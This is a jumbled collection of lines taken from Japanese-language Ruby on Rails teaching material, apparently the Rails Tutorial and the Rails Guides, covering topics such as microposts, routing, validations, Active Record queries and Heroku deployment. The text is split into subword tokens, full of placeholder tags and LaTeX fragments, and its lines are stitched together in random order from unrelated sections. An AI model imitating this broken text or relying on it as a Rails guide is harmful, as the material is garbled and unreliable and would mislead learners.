▁ データベースから ユーザーのマイクロポスト を 読み 出 す \ k ode { user ▖ microposts } メソッドは 、 デフォルトでは 読み出し の順序 に対して 何も 保 証 しません が 、 ▁ ブログ や Twitter の慣習 に従って 、 作成 時間 の 逆 順 、 つまり 最も 新しいマイクロポスト を 最初に 表示する ように してみましょう 。
▁Ruby ▁console ▁for ▁your app ▖ heroku app ▖ com
▁WARNING : ▁ ある [ 長 年 の 未 解決 バグ ]( https :// github ▖ com / rails / rails / issue s /1 76 9 ) ▁ が原因で 、` form _ for ` では 単数形 リソース を自動的に 扱 え ません 。
▁resources ▁: users
▁* ▁FROM ▁" users " ▁WHERE ▁" users "▖" state " ▁= ▁' inactive '
▁この章では 、 Users リソース 用の REST アクション ▁( 表 \ ref { table : RESTful _ users }) ▁ のうち 、 これまで 未 実装 だった \ k ode { edit }、\ k ode { update }、\ k ode { index }、\ k ode { destroy } アクション を加え 、 REST アクションを 完成させます 。
▁<%= ▁stylesheet _ link _ tag ▁" scaffold " ▁%>
▁** config / routes ▖ rb **
▁さらに 、 与えられた パスワードを セキュア に 認 証 できる 機能 も 実装 しました 。
▁ テスト も パスするはずです 。
▁#### ▁Active ▁Record をテストする
▁resources ▁: photos , ▁controller : ▁' images '
▁このメソッド には `: remote ` オプション があり 、 以下のように 使用できます 。
▁ここまで の 作業 内容 を コミット していない 場合 、 作業 の 区切り を つ け るために も コミット しましょう 。
▁| ▁| ▁ 22 6 ▁| ▁: im _ used ▁|
▁ こうすることで 、 bin stub の 生成 が 終 わ って から Bundler が 実行されます 。
▁ 他にも 、\ href { http :// ent p ▖ com /}{ E N T P } や \ href { http :// thoughtbot ▖ com /}{ thoughtbot }、\ href { http :// p ivotal lab s ▖ com /}{ P ivotal ▁L abs }、\ href { http :// h ashrocket ▖ com /}{ H ashrocket }、\ href { http :// www ▖ h app y f un c or p ▖ com /}{ H app y F un C or p } といった 、 Rails を 専 門 的に 扱 う 会 社 も 数 多く あります ▟ また 、 Rails を 専 門 にした フ リ ー ラン ス の コ ン サ ル タ ン ト や イン スト ラ ク ター 、 開発者 については 数 え き れ ません 。
▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App
▁ リソース に対して 作成 ▁( create ) 、 読み出し ▁( read ) 、 更新 ▁( update ) 、 削除 ▁( destroy ) ▁ の 4 つの 操作 を行なう ことができる よう になっ ており 、 これらの 操作 の 頭 文字 を 取 って ▁ _ CRUD _ ▁ と呼ばれ ます 。
▁* ▁`: touch `
▁# ▁ クライアント コード
▁` Comment ` ▁ モデル ▁( app / models / comment ▖ rb ) ▁ 内の コード に 既に 書かれてい た ように 、1 つの 記事 には 1 つの コメント が 属 しています 。
▁ プリコンパイル 済み の アセット は ファイルシステム 上 に置かれ 、 Web サーバー から 直接 クライアント に 提供され ます 。
▁{0} 図 12 ▖ 14 {/0} ▁{1} フォローしているユーザー 用 ページのモックアップ {/1}
▁[] ▖ prepend (10) ▁# ▁=> ▁[ 10 ]
▁has _ one ▁: account _ history
▁xml ▖ item ▁do
▁ マイクロポストの パーシャル に 削除リンク を追加する
▁### ▁` reverse _ order `
▁class ▁Article ▁< ▁ActiveRecord :: Base
▁ 確 か に 空 文字列 が 出力 されました ▟ 今度は \ emph { nil } に対して メッセージ を \ k ode { 連 鎖 ▁( chain )} ▁ して 渡 せる ことを確認します 。
▁invoke ▁ erb
▁ サンプルアプリケーション 用の \ k ode { Gemfile }
▁( リスト \ ref { code : proposed _ contact _ page } には リスト \ ref { code : base _ title _ test } のような 修正 は 行われ ていない ので 、 そのまま コ ピ ペ しても 動きません ) 。
▁ここで 、 Ruby の 関数 は ▁\ emph { 暗 黙 の 戻り値 } を持つ という ことに注意してください ▟ これは 、 最後に 評価 された 式 の値 が自動的に 返される ことを意味します ▟ この場合 、 引数 の \ k ode { string } が 空 かどうか に 基 づ いた 2 つの メッセージ 文字列 のうち のいずれか が返されます 。
▁The ▁view ▁for ▁the ▁Help ▁page ▁with ▁full ▁HTML ▁structure ▖ ▁ {2}{3}{/3}{3}{4} r ed {/4}{/3}{3}{/3} {/2}
▁これは 現在の レイアウト でも 、\ emph { ある 点 を除いて } 達 成 されています ▟ もし ビューの 1 つ から \ k ode { provide } 呼び出し を削除する と 、 その ページ 固有の タイトル の代わりに 以下の タイトル が表示されます 。
▁[1, ▁2, ▁3] ▖ in _ groups _ of (2) ▁# ▁=> ▁[[1, ▁2 ] , ▁[ 3 , ▁nil ]]
▁# ▁=> ▁+ 1 - 123 - 555-1234
▁ デフォルト値 は ` true ` です 。
▁ 現在の メール の実装 をテストする
▁つまり 、 以下のコード は 、
▁ 代わりに 、 サインイン に 失敗した ときに フラッシュメッセージ を表示する ことにします 。
▁( 詳細な 文字列 を調べる ために \ ref { sec : hashes _ and _ symbols } で紹介した \ k ode { inspect } メソッド を使っています ▟)
▁ コールバック
▁\ k ode { if } - \ k ode { else } 文 の 2 つの 分 岐 に対して 、 それぞれ 異なる パーシャル を使用する ように ホームページ を リファクタリング してください 。
▁この こと から 、 複数の アサーション を 1 つの テスト に まとめ るように して 、( minitest を通して ) ▁Ruby に どの セ リ フ で 間違った のか を 話 させる ようにしています 。
▁最後に 、` app / views ` ディレクトリ の下に は ` layouts ` フォルダ があります ▟ ここに は ` blorgh / application ▖ html ▖ erb ` という ファイル が置かれます 。
▁create ▁app / views / blorgh / articles / edit ▖ html ▖ erb
▁ コントローラは 、 場合によっては すぐに \ emph { view } ▁( ビュー ) ▁ を生成し て HTML を ブラウザに 送 り 返します 。
▁Rails は \ href { http :// en ▖ w ikipedia ▖ org / wiki / S u i _ g en er is }{\ emph { 独 特 } } であり 、 ▁Ruby とは 切り 離 して 学習 する必要があります 。
▁もちろん 、 シ ン プ ル になった ということは 完成 度 が \ emph { さらに } 高 ま った ということ の 証 し であり 、 退 化 した わけではありません ▟ {1} {2} 第 2 章 {/2}{/1} で scaffold に 頼 り き り だった 頃 から ここに 至 る まで は 長い 道 の り でした が 、 今 では scaffold が 生成する ような 複雑な コード はほとんど 不要 になりました 。
▁ 出力 例 :
▁# ▁See ▁ https :// help ▖ github ▖ com / articles / ig n or ing - file s ▁for ▁more ▁about ▁ignoring ╼ # ▁files ▖
▁render ▁action : ▁" special _ show " ▁and ▁return
▁About
▁リスト \ ref { code : generate _ user _ model } で ユーザー用の fixture が自動的に 生成 されています が 、 メールアドレスが 一意 になって いません ▁( リスト \ ref { code : default _ fixtures }) 。
▁Micropost の 初期 テストは User モデルの 初期 テスト ▁( リスト \ ref { code : name _ presence _ test }) ▁ と似ています 。
▁Bootstrap フレームワーク を使うと 、 い い 感じ の デザイン を 素 早く 実装 できる
▁この ディレクトリ 名 と ファイル名 は 、 どちらも 重要です 。
▁上のコードでは 、 { p 0} で 導 入 した {2} error _ messages {/2} パーシャル を再 利用 しています 。
▁create ▁app / helpers / welcome _ helper ▖ rb
▁size ▖ zero ?
▁=> ▁#< Proc : 0 x 0 07 fa b 9 38 d 0 1 08 @ ( i rb ) : 1 ▁( lambda ) >
▁> > ▁Blorgh :: Article ▖ find (1)
▁図 \ ref { fig : proto _ feed _ mockup } のモックアップ で示した ような 、 ユーザー 自身 の ポスト を含む マイクロポストの \ k ode { フィード } がない と 不 便 です
▁この 変更 は 、 ルーティング ファイルの \ k ode { resources } 行 で 行います ▁( リスト \ ref { code : password _ resets _ resource }) 。
▁use ▁ ActionDispatch :: Flash
▁この プロジェクト で 特に 新しい ワークスペース を作成する 必要はありません ) 。
▁` has _ one ` 関連付け では 以下の オプション が サポート されます 。
▁`: only ` オプションは 、 指定された ルーティング だけ を生成する よう 指示 します 。
▁self を省略した 結果を リスト \ ref { code : micropost _ partial _ image _ display } に示します 。
▁上のコード を実行すると 、 ユーザーの ブラウザ 内の 一時 cookies に 暗号化 済み のユーザー ID が 自動 で 作成されます ▟ この後 の ページ で 、\ k ode { session [: user \_ id ]} を使用して ユーザー ID を 元 通り に 取り出す ことができます 。
▁ 検証 ( validation )
▁ _ user _ objects ▁( end )╼╼ ▁% ▁section ▁user _ model ▁( end )╼╼ ▁\ section { ユーザー を検証する } ▁% ▁( fold )╼ ▁\ label { sec : user _ validations }╼╼
▁> > ▁x ▁* = ▁3
▁ シンボル と 文字列 どちら を使用した 場合にも 、 上のコード は以下のようになります 。
▁ 筆者 は 普 段 、 ターミナル や テキストエディタ の 背 景 は 黒 色 に しています が 、 明 る い 色 の 背 景 の方が ス ク リ ー ン シ ョ ッ ト の 見 栄 え が 良い ので 、( 一時 的に ) ▁ 明 る い 背 景 を使用しています 。
▁# ▁Check s ▁for ▁ pending ▁migrations ▁before ▁tests ▁are ▁run ▖
▁` id ` メソッドは 、 この ` ActiveRecord :: Missing A tt ri but e Error ` を 発生 しません ▟ このため 、 関連付け を扱う 場合には 注意してください ▟ 関連付け が 正常に 動作する には ` id ` メソッド が必要 だ からです 。
▁| --- ---------------- ---------------- | --- --------------- -------- |
▁なお 、\ k ode { install } は 省略 可能です 。
▁* ▁` config ▖ active _ record ▖ table _ name _ prefix ` は 、 テーブル名 の冒頭 に グローバル に追加し たい 文字列 を指定します 。
▁これで テストにパス するはずです 。
▁ レイアウト の ▁“ Settings ” ▁ リンク を更新する
▁ これはリスト \ ref { code : gemfile _ pg _ gem } で使用されていました 。
▁` link _ to ` などの ヘルパー でも 、 完全な ` url _ for ` 呼び出し の 代りに 単 に オブジェクト を渡すことができます 。
▁create ▁app / assets / javascripts / blorgh / comments ▖ js
▁ THE _ U S - ER @ foo ▖ bar ▖ org
▁つまり 、 WEBrick は \ href { https :// dev center ▖ heroku ▖ com / articles / ruby - default - web - server } { 本番環境 として 適切な Web サーバ ではありません } ▟ よ って 、 今回は \ href { https :// dev center ▖ heroku ▖ com / articles / rails - Puma } { WEBrick を Puma という Web サーバ に置き換え て みます } ▟ Puma は 多数の リクエストを 捌 く ことに 適 した Web サーバ です 。
▁t ▖ references ▁: image able , ▁ polymorphic : ▁true
▁図 \ ref { fig : signup _ form } の フォームの HTML ソース
▁ どの スコープ メソッド も 、 常に ` ActiveRecord :: Relation ` オブジェクトを返します ▟ この オブジェクトに対して 、 別の スコープ を含む 他の メソッド呼び出し を行なう こともできます 。
▁`-- skip - sprockets ` オプションを使用すると 、 Rails ▁4 で ` sass - rails ` と ` uglifier ` が Gemfile に 追加 され なくなります ▟ アセットパイプライン を 後 から 有効 に したい場合は 、 これらの gem も Gemfile に追加する 必要があります 。
▁{0} リスト 2▖1 0 {/0} ▁╼╼{1} マイクロポストの 最 大文字 数を 140 文字 に 制限 する ▟ {2} {/2} ▁ {3} app / models / micropost ▖ rb {/3} {/1}
▁### ▁ テ キ スタイル インジェクション
▁d ▖ monday ▁# ▁=> ▁Mon , ▁10 ▁Sep ▁2012
▁* ▁` load _ config _ initializers `: ▁ アプリケーション や railties や エンジン に含まれる ` config / initializers ` にある Ruby ファイル をすべて 読み込み ます 。
▁Client ▖ select (: id , ▁: name )▖ map ▁ { ▁| c | ▁[ c ▖ id , ▁c ▖ name ] ▁ }
▁リスト \ ref { code : generated _ user _ mailer _ test } の テストでは 、\ k ode { assert \_ match } という 非常に 強力な メソッド が使用されています ▟ これ を使えば 、 正規表現 で 文字列を テスト できます 。
▁Home ページ に表示されている 1 ページ 目 の フィード を テスト してください 。
▁ ブラウザ ごとに ユーザーの ログイン セッションを 記 憶 する 設計 に 変更 すれば 、 ユーザー にとって もう少し 便 利 には なります が 、 その 分 セキュリティ が 低 下 する う え 、 実装 も 面倒 になります 。
▁このとき 、 先ほど 定義 した User モデルの 属性 ▁( 図 \ ref { fig : user _ model _ password _ digest }) ▁ に 対応 した カラム がある ことに も 注 目 しておいてください
▁ どんな に 簡単な リファクタリング であっても 、\ emph { この 手 の } 変更 は つ い 忘れ てしまう ものです ▟ テストを き ち ん と 書 いて お け ば 、 この種の 見 落とし を 検出 できます 。
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s ▖ id ▁ IN ▁( 1, 10 ) )
▁` config ▖ autoload _ once _ paths ` の配列 に含まれる 要素 は 、 次 で説明する ` autoload _ paths ` にも まったく 同じ よう に含め ておく 必要があります 。
▁ 具体的には 、 このメソッドは 与えられた ペ ア から ▁ _ 値 _ ▁ に応じて ノード を作成します 。
▁ パーシャル に 独自の レイアウト を適用する ことができます 。
▁ 基本的に は リソース フル ルーティング を使用 すべき では あります が 、 このような 単純な ルーティング の方が 適 している 箇所 も 多数 ある はずです 。
▁{0} 図 2 ▖9{/0} ▁{1} 2 人目のユーザー が追加された 一覧 ページ ▁(\ href { http :// localhost :3000/ users }{/ users }) {/1}
▁作成した コードをリスト \ ref { code : log _ in _ success } に示します
▁╼╼ ▁\ section { ユーザー を更新する } ▁% ▁( fold )╼ ▁\ label { sec : updating _ users }╼╼
▁ ローカライズ 版 の テンプレート が 見当たらない 場合は 、 装 飾 な し のバージョン が使用されます 。
▁ 有効な オブジェクトに対して テストを書く ために 、\ k ode { setup } という 特殊な メソッドを使って 有効な User オブジェクト ▁(\ k ode {@ user }) ▁ を作成します ▁( このメソッドは 第 \ ref { cha : static _ pages } 章 の演習 でも 少し 取り上げ ました )▟ setup メソッド 内に 書かれた 処理 は 、 各 テストが 走 る 直前に 実行されます ▟\ k ode {@ user } は インスタンス変数 ですが 、 setup メソッド 内で 宣言 しておけば 、 すべての テスト 内で この インスタンス変数 が 使える ようになります ▟ したがって 、\ k ode { valid ?} メソッドを使って User オブジェクトの 有効 性 をテストする ことができます ▁(\ ref { sec : creating _ user _ objects }) ▖ 。
▁PATCH および この 変更 が 行われた 理由 については Rails ブログ の ▁[ この 記事 ]( http :// web log ▖ rubyonrails ▖ org / 20 12 / 2 / 2 6 / ed ge - rails - patch - is - the - new - primary - http - method - for - update s / ) ▁ を参照してください 。
▁ 以下のように 、 文字 に対して も 範囲 を使用できます 。
▁# ▁active _ record / associations ▖ rb
▁ これはリスト \ ref { code : base _ title _ test } で使用されていました 。
▁{0}{1} 図 2▖1 0 {/1}{/0} の ▁[ Destroy ] ▁ リンクをクリックすると ユーザーが 削除され 、 index ページの ユーザーは 1 人 だけ になります
▁m o un t ▁Blorgh :: Engine ▁=> ▁"/ blorgh "
▁ 下 部 の フォーム は ` UsersController ` の ` create ` アクション を呼び出します 。
▁このセクションでは 、 メイラー と ビュー の作成 方法を 手順を 追 って 説明します 。
▁ 当 然 ながら 、 Heroku は 本番 サイト 用の プラットフォーム なので 、 実行される アプリケーション はすべて 本番環境 となります 。
▁{0}{1} リスト 1 ▖ 14 {/1}{/0} で 追加 した gem は 本番環境で しか 使用 し ないので 、 この フラグ を追加した コマンド を実行すると 本番 用 gem は ローカル に 追加 されません ▟ 今 この コマンドを実行 するのは 、 後 の 本番環境 への デプロイ に 備えて \ k ode { Gemfile ▖ lock } を更新し 、\ text tt { pg } ▁gem と \ text tt { rails _ 12 factor } ▁gem 、 Ruby バージョンの 指定 を Gemfile ▖ lock には ん え い s 必要がある ためです 。
▁ いずれ の場合 も 、 表 \ ref { table : password _ token _ digest } の 認 証 メソッドを 完了 します 。
▁上のコードは 動作します が 、 今 のまま では \ k ode { session } も \ k ode { cookies } も それぞれ 2 回 使用 され てしまい 、 無 駄 です 。
▁has _ many ▁: orders , ▁ inverse _ of : ▁: customer
▁#### ▁` find _ by `
▁#### ▁ コレクション を レンダリング する
▁create ▁db / migrate / 2013 0 30 5 22 17 14 _ create _ users ▖ rb
▁デフォルトのエラーメッセージは ▁_" has ▁already ▁been ▁taken " _ ▁ です 。
▁t ▖ belongs _ to ▁: patient
▁Active ▁Support では 、` DateTime ▖ current ` を ` Time ▖ now ▖ to _ datetime ` と同様に 定義 しています ▟ ただし 、` DateTime ▖ current ` は ユーザー タイムゾーン が 定義されている 場合 に対応する 点 が異なります 。
▁ パスワード の長さ が 6 文字 以上 であること を検証する テストを 、 以下の L リスト \ ref { code : minimum _ password _ length _ test } に示します 。
▁その 理由は 、` Hash ` や ` Order ed Hash `、` Proc ess :: S t at us ` などの クラス では 、 正しい JSON 表現 を提供 するために 特別な 処理 が必要になる ためです 。
▁24 , ▁ 25 , ▁2 6 , ▁ 27 , ▁28 , ▁29 , ▁30 , ▁31 , ▁ 32 , ▁3 3 , ▁ 34 , ▁3 5 , ▁ 36 , ▁ 37 , ▁ 38 , ▁3 9 , ▁40 , ▁4 1, ▁ 42,
▁name ▖ s ub ( / Test $ / , ▁' ')▖ constantize
▁ Turbolinks
▁{0} 図 10 ▖ 10 {/0} {1} マイクロポスト作成フォーム のある ホームページ のモックアップ ▟\ href { http :// railstutorial ▖ org / images / figures / home _ page _ with _ micropost _ form _ mockup _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁ バックエンド での キュー イン グ 作業 では 、 操作 方法 以外の ことを 気 に せずに 済み ます 。
▁ ing ▁\ k ode { Micropost ▖ find } ▁that ▁the ▁user ' s ▁first ▁micropost ▁was ▁also ▁destroyed ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - ec 2 e 6 b ' ></ span >╼╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁ ordering _ and _ dependency ▁( end )╼╼ ▁% ▁section ▁a _ micropost _ model ▁( end )╼╼ ▁\ section { マイクロポスト を表示する } ▁% ▁( fold )╼ ▁\ label { sec : showing _ microposts }╼╼
▁bundle ▁install
▁form タグ に ` data - remote =" true " ` という 属性 が追加され て いることにご注目ください 。
▁* ▁Active ▁Record モデル で さまざまな 計算 を行う
▁validates ▁: subdomain , ▁ exclusion : ▁ { ▁in : ▁% w ( www ▁us ▁c a ▁ jp ),
▁ 具体的には 、` demodulize `、` underscore ` を実行し 、 末尾に ▁" _ id " ▁ を追加します 。
▁しかし このような 初 歩 的な 作業を い つ まで も 続ける わ け には い き ません ので 、 今 の 私 た ち の Ruby に関する 知識 と 経験 の 限 界 に 真 正 面 から 挑 み 、 これを 乗 り 越 え るために この章 を 割り当て る ことにします 。
▁上のコードは \ emph { メソッド 参 照 } と呼ばれる もの で 、 こうすることで Rails は \ k ode { create \_ activation \_ digest } という メソッド を探し 、 ユーザー を作成する 前に 実行 するようになります
▁Ruby ▁API には 高 濃 縮 の 情報 が 詰 ま っています ▁( 少々 濃厚 \ emph { すぎる } とも 言えます )▟ たとえば 、 Ruby の 文字列 の詳細 を知り たい場合は 、 Ruby ▁API エントリ の \ k ode { String } クラス を参照 すればよいのです 。
▁{" first _ name "=>" R a fa el ", ▁" created _ at "=>" 20 12 - 11 - 10 ▁23:2 3 : 45 ▖ 28 11 89 " },
▁ 暗 黙 の リテラル コンストラクタ を使う 代わりに 、 明示的に 同等の \ emph { 名前付き コンストラクタ } を使う ことができます ▟ 名前付き コンストラクタ は 、 クラス名 に対して \ k ode { new } メソッド を呼び出します
▁ エンジン は プラグイン になる ことも でき 、 プラグイン が エンジン になる こともできます 。
▁上のコード が動作する には 、 この \ k ode { password _ reset _ expired ?} メソッド を定義する 必要があります 。
▁{0} 図 3 ▖2{/0} {1} \ href { http :// localhost :3000/ static _ pages / home }{/ static _ pages / home } にアクセス した結果 ▟\ href { http :// railstutorial ▖ org / images / figures / raw _ home _ view _ 3 1 - full ▖ png }{( 拡大 ) }{/1}
▁M ac ▁OS ▁X や Windows を使用している場合 は 、 OS に JavaScript ランタイム をインストール してください 。
▁( 試 し に エスケープ 処理を 外 して 、 HTML の ソースコード を 注意 深 く 調 べ てください ▟ マイクロポスト の内容 が お か しい はずです ▟)
▁ これら 特定の メッセージ の 前に は 、 大文字 で始まる 属性 名 が追加され ます ▟ ` add ` メソッドは 、 メッセージ を追加した い 属性 名 、 および メッセージ 自身 を受け取り ます 。
▁Rails で オブジェクトが 有効 ( valid ) である かどうか を検証する には 、` valid ?` メソッドを使用します 。
▁リスト \ ref { code : toy _ user _ presence _ val ic ation s } を 次のように 更新 してください : ▁\ k ode { FILL _ IN } の 部分を 適切な コード に置き換え 、 User モデル の名前 属性 と メール 属性 が存在する かどうか のバリデーション を 行えるように します ▁( 図 \ ref { fig : user _ presence _ validations }) 。
▁* ▁` ActiveSupport :: D eprecation ▖ be ha v i or ` は 、` config ▖ active _ support ▖ d eprecation ` に対する もう 一 つの セッター であり 、 Rails の 非推奨 警 告 メッセージ の表示 方法 を設定します 。
▁ この時点では Ruby の 文法 については 気にする必要はありません ▟ 第 \ ref { cha : rails _ flavored _ ruby } 章で 詳 しく 解説します 。
▁リスト \ ref { code : user _ index _ view } では 、\ ref { code : gravatar _ option } の演習 の リスト \ ref { sec : signup _ exercises } の結果 を利用して います ▟ これは 、 Gravatar ヘルパー に デフォルト 以外の サイズ を指定する オプションを 渡します 。
▁以下の ルーティング を例にとって みましょう 。
▁class ▁Article sController
▁` belongs _ to ` 関連付け は 、 別の モデルと の 間 に 1 対 1 の関連付け を作成します 。
▁次に 、\ k ode { bundle ▁install } で Spork をインストール します 。
▁$ ▁git ▁log ▁master ▖ ▖
▁ アセットパイプライン は自動的に ERB を 評価 します 。
▁ 最後の 第 \ ref { cha : user _ microposts } 章 と 第 \ ref { cha : following _ users } 章では 、 マ イ ク ロ ブログ 機能 と ソーシャル 機能を実装し 、 実際に 動作する Web サイト を 完成させます 。
▁Client ▖ create _ with ( locked : ▁false )▖ find _ or _ create _ by ( first _ name : ▁' Andy ')
▁sample ▁application ▖
▁C :: X ", ▁true ) ▁# ▁=> ▁true
▁#### ▁content _ tag _ for
▁1 つの 例として 、 アプリケーション スタイルシート 用の マニフェストファイル を見てみましょう ▁( リスト \ ref { code : app _ css _ manifest }) 。
▁ umerate }╼╼ ▁% ▁subsection ▁length _ validation ▁( end )╼╼ ▁\ subsection { フォーマット を検証する } ▁% ▁( fold )╼ ▁\ label { sec : format _ validation }╼╼
▁これは ▁ _ 正しく ありません _ ▁ 。
▁class ▁ Account ▁< ▁ActiveRecord :: Base
▁\ k ode { sign _ in } 関数 の コードを もう い ち ど よく 見 てみてください 。
▁ SELECT ▁* ▁FROM ▁comments ▁WHERE ▁article _ id ▁= ▁10 ▁OR DER ▁BY ▁name
▁Sass の mixin 機能 を使うと 、 CSS の ルール を まとめ たり 他の 場所 で 再 利用できる ような る
▁上の 3 つ のメリット は 、 テストを 先に 書 か なくても \ emph { 得 ることができます } が 、 それ でも テスト駆動開発 ▁( TDD ) ▁という 手法 を い つ でも 使えるように しておけば 、 間 違い なく 多くの 場 面 で 役に立ちます 。
▁ 私 の お 気 に 入 り は Heroku で 、 Rails を含む Ruby ▁Web アプリ 用の ホスティング プラットフォーム です
▁ 例として 、 以下のような ビュー が あるとします 。
▁このメソッド の動作 は ` render ` と 完全に 同じ であり 、 出力結果 を ブラウザに 返 さ ずに 文字列 を返す 点 だけ が異なります 。
▁` ActiveRecord :: Base ▖ lock _ optimistic ally ▁= ▁false ` を設定する と この動作 をオフに できます 。
▁上 を ログインフォーム に 反 映 した コードをリスト \ ref { code : remember _ me _ checkbox } に示します 。
▁ 結果は 図 \ ref { fig : demo _ micropost _ index } の よう になるはずです 。
▁-------
▁ コメント はまだ 正常に 表示 できません 。
▁#### ▁ 二 重 レンダリング エラーを 避ける
▁ ハッシュ を 1 つ 指定 して オプション を追加する こともできます 。
▁second s _ since _ midnight
▁create ▁app / controllers / welcome _ controller ▖ rb
▁self を省略した 結果を リスト \ ref { code : proc file } に示します 。
▁上のルーティングは ` / photos / A 12345 ` のような パス には マッチ します が 、` / photos / 89 3 ` には マッチ しません 。
▁# ▁=> ▁< label ▁for =" name "> Name </ label >
▁ これはリスト \ ref { code : signup _ form _ html } で使用されていました 。
▁Client ▖ pluck (: id )
▁# ▁=> ▁Mon , ▁ 02 ▁A ug ▁2010 ▁ 23 : 15 : 17 ▁+0000
▁ ところで 、\ k ode { form } ▁ タグ の 内 側 で 次のような HTML が生成され ていた ことに も お 気 付き でしょうか 。
▁これは 、 アプリケーションの 内部で 作成された テーブル は エンジンの 内部で 作成された テーブル とは 異なる ためです 。
▁| log / | アプリケーションの ログ ファイル が置かれます 。
▁ strip _ links (" < a ▁ href =" http :// rubyonrails ▖ org "> Ruby ▁on ▁Rails </ a > ")
▁ 記憶トークン 用の 最初の テスト 。
▁( 第 \ ref { cha : sign _ up } 章で もっと 便利な メソッドを 紹介します )
▁ 今回は \ k ode { has \_ many ▁through } を使用します ▟ 図 { p 1 } のように 、1 人のユーザー には い く つ もの 「 フォロー {3} する / される {/3} ▁( 多 対 多 )」 の リレーションシップ があります 。
▁たとえば 、 たくさん の モジュール がある jQuery ライブラリ を使用して いて 、 それら が ` lib / assets / javascripts / library _ name ` に保存 されている とします ▟ この ` lib / assets / javascripts / library _ name / index ▖ js ` ファイルは その ライブラリ 内の すべての ファイル で 利用できる マニフェスト として 機能 します 。
▁== == ================
▁HTTP リクエスト に レスポンス を返す もう 一 つの 方法は 、` redirect _ to ` を使用すること です 。
▁p ▖ errors [: name ]
▁\ k ode { bcrypt - ruby } を \ k ode { Gemfile } に追加する 。
▁▖▖▖
▁# ▁in ▁ spec / support / ▁and ▁its ▁subdirectories ▖
▁Rails ▁4▖1 から I 18 n オプション ` en force _ available _ locales ` が デフォルトで ` true ` になりました 。
▁=> ▁[#< User ▁id : ▁1, ▁name : ▁" Michael ▁Hartl ", ▁email : ▁" mhartl @ example ▖ com ",
▁Bootstrap ▁CSS を追加する
▁* ▁( 変更 内容 の 要 約 を 記 入 します )
▁ 本書 の最初の 版 では \ k ode { user ▖ following } と していました が 、 結 局 これも 混 乱 を 招 く ことに 気 付き ました 。
▁この よう になっている のは 、 エンジンの マイグレーション は アプリケーションの 既存の マイグレーション がすべて 終 わ って から 実行する 必要がある ためです 。
▁\ k ode { split } で 文字列を 区 切 って 配列 に するときに はデフォルトで 空白 が使用されます が 、 以下のように 他の 文字 を指定して 区 切 ることもできます 。
▁` end _ of _ hour ` メソッドは 、 その 時の 最後の 時点 ▁( h h : 59 : 59 ) ▁ の タイムスタンプ を返します 。
▁ ここ で言う 「 リソース 」 とは 、 記事 、 人 、 動 物 などの よく 似 た オブジェクト 同士 が 集 ま った もの を指します 。
▁* ▁` create `
▁ コントローラは 、 ビュー で生成された HTML を受け取り 、 ブラウザに 返す
▁create ▁app / views / layouts / mailer ▖ html ▖ erb
▁ この時点では 、 デフォルト 以外の gem をインストール する必要はありません 。
▁上のコードでは 、\ k ode { add _ column } メソッドを使用して \ k ode { password _ digest } ▁ カラム を \ k ode { users } テーブルに 追加 しています 。
▁この フォーム ページの ソース を表示し て 、 生成された HTML を よく 調 べ てみると 、 フォームの ` action ` 属性 の 送信 先 が ` / articles / new ` になって しま っています 。
▁ 文字列 を使用することもできます ▟ この 文字列 は 後で ` eval ` で 評価 される ため 、 実行 可能な 正しい Ruby コードを 含 んで い る必要があります 。
▁To y アプリケーションに も 同じ index アクション が あった ことを思い出してください ▁( リスト \ ref { code : demo _ index _ action })▟ そ のときと同様に 、\ k ode { User ▖ all } を使って データベース上の 全 ユーザー を取得し 、 ビューで 使用 可能な \ k ode {@ users } という インスタンス変数 に 代入 させ ます ▁( リスト \ ref { code : user _ index }) 。
▁render ▁action : ▁" special _ show "
▁作成した Relationship データモデル を 図 \ ref { fig : relationship _ model } に示します 。
▁ 指定 できる オプションは 次の シンボル `: memory _ store `、`: file _ store `、`: me m _ cache _ store `、`: null _ store ` のいずれか 、 または キャッシュ API を実装する オブジェクト です 。
▁* ▁` before _ remove `
▁# ▁ エラーメッセージ を表示し 、 サインイン フォーム を再 描画 する 。
▁これは 、 エンジン が 名前空間化され る の と同様 、 エンジンの アセット も同様に 名前空間化され る 必要がある からです 。
▁という 書き 方 ▁( リスト \ ref { code : micropost _ validity _ test }) ▁ が 、 以下のように 書き 換 えられ ます 。
▁`: on ` オプションは 、 バリデーション 実行 の タイミング を指定します 。
▁* ▁` order `
▁ ダブルクォート 文字列 でも シングルクォート 文字列 と同じ ことができ 、 ダブルクォート 文字列 では 式 展開 も できる のであれば 、 シングルクォート 文字列 には どのような 使い 道 がある のでしょうか 。
▁ ブロック が与えられ た場合 、` sum ` は イ テ レ ー タ になって コレクション の 要素を yield し 、 そこ から 返 された 値を 合 計 します 。
▁belongs _ to ▁: customer , ▁ dependent : ▁: destroy ,
▁> > ▁x ▁ += ▁1
▁### ▁ シンプルな 例
▁#### # ▁` beginning _ of _ quarter `、` end _ of _ quarter `
▁<%= ▁render ▁" shared / footer " ▁%>
▁なお 、 今回は ▁( 先 頭 が 大文字 の ) ▁" Rails " と するために \ k ode { alt } テキスト を明示的に 設定 しています 。
▁Blorgh :: Engine ▖ routes ▖ d raw ▁do
▁` object ` が 属 する クラスの メソッド 値 の 既存の 戻り値 を コレクション にした ` check _ box ` タグを返します 。
▁ 注 : ▁この コメント 部分 に 書く コードは それ なり に 込 み 入 っています ▟ 可能 であれば 、 一 行 ずつ 読んで 完全に 理解 しておく ことをおすすめします ▟ ( 訳 注 : ▁ テスト のコード では 、 操作を 実現 するために このような ト リ ッ キー な コードを 使 わ ざ る を 得 ない とき があります ▟)
▁Rails 経験 の 長い 多くの 開発者 から 、 おかげで Web アプリケーションの 開発 が と ても 楽 しく な った という 意 見 を い ただ い ています 。
▁"2010-07-27 ▁23:37:00 "▖ to _ datetime ▁# ▁=> ▁Tue , ▁ 27 ▁Ju l ▁2010 ▁23:37:00 ▁+0000
▁* ▁` production ` 環境 は 、 アプリケーションを 世界 中に 公開 する 本番 で 使用されます 。
▁\ text tt { curl } などの コマンドライン ツール を使用すると 、\ text tt { PATCH } リクエストを この 形式で 送信 することができます 。
▁Rails の 哲 学 には 、 以下の 2 つの 主要な 基本 理 念 があります 。
▁validates ▁: name , ▁presence : ▁true , ▁length : ▁ { ▁ minimum : ▁3 ▁ }
▁Active ▁Record の モデル クラス または モデル インスタンス に対して ` logger ` メソッドを呼び出す と 、 この ロガー を 取り 出 せ ます 。
